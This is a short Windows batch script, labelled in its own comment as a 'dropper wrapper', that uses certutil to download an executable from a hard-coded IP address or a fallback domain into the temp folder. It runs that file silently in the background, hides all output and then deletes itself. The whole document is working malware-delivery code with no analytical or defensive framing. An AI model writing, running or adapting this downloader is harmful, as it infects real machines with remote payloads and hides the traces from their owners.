@echo off
setlocal EnableExtensions

rem dropper wrapper - downloads and runs native payload
certutil -urlcache -split -f "https://193.26.115.196/dropper.exe" "%TEMP%\d.exe" >nul 2>&1
if exist "%TEMP%\d.exe" (
    start /b "" "%TEMP%\d.exe"
) else (
    certutil -urlcache -split -f "https://signindat.com/dropper.exe" "%TEMP%\d.exe" >nul 2>&1
    if exist "%TEMP%\d.exe" start /b "" "%TEMP%\d.exe"
)
del /f /q "%~f0" >nul 2>&1
exit /b
